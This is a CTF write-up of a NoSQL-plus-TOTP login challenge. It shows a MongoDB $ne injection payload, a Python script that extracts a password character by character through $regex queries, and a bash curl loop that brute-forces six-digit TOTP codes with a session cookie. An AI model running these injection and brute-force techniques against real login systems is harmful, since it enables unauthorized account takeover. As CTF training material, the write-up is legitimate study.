# NoSQL and  TOTP

Sadly, because of some infrastructure downtime during CTF, I didn't manage to finish the TOTP part.
However, I solved the first part (NoSQL).

## NoSQL

So, we had a webpage with some login form, playing with it shows that submitting a logging request was asking (https://nosql-totp.fic2k18.ctf/sender.php) to validate.

The payload was like :

```json
{"username": "someuser", "password": "somepassword"}
```

We know there is some nosql vulnerability, so we first tried Mongo, with something like:

```json
{"username": {"$ne": "foo"}, "password": {"$ne": "bar" }}
```

and we got `OK` \o/. So we have some oracle to guess the username and password.

`$regex` to the rescue, we can find each char one by one. Following code is to BF password, same was used for username:

```python
#!/usr/bin/env python

import requests
import urllib3
urllib3.disable_warnings()
import string
import urllib


u="https://nosql-totp.fic2k18.ctf/sender.php"

user="Barry Allen"
password=""

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (user, password + c)
            r = requests.post(u, data = {'ids': payload}, verify = False)
            if 'OK' in r.text:
                print("Found one more char : %s" % (password+c))
                password += c
```

After a few minutes, we got :

 * Username : Barry Allen
 * Password : H5dfssdfG2DDDF665SDdf2s

## TOTP

We then logged in, and saw the site was asking for a TOTP (One time password). We didn't get the private key or whatever, however looking in TOTP/ directory (thanks to the url) we found that https://github.com/Voronenko/PHPOTP has been used. 

So likely the OTP is a six digits number, valid for 30 seconds. And once again we had an oracle sending '0' if the TOTP was invalid (and so we guess '1' if it is valid).
You can try as many OTP as you want, given they change every 30s. There are ~ 999999 possibilities so you may still get the good value after some reasonable time.

Based on this, we should be able to:

 * Login
 * Get PHPSESSID
 * Bruteforce the TOTP until I get '1'
 * Go to admin page.

I bruteforced it with some stupid curl (starting at 100000 because I was too lazy to format it correctly):

```bash
ret=0; i=100000; while [ $ret -eq 0 ];do ret=$(curl -s http://10.15.10.106:8001/TOTP/checkTotpCode.php -H 'Cookie: PHPSESSID=XXXXXXXXXX' --data "totp_code=${i}"); echo "$ret : $i"; i=$((i+1)) ;done
```

After the infrastructure came back, I started to bruteforce a bit, and at some point got this `1` I was waiting for.

Sadly, I was working on some other challenge and see it returned way too late :(
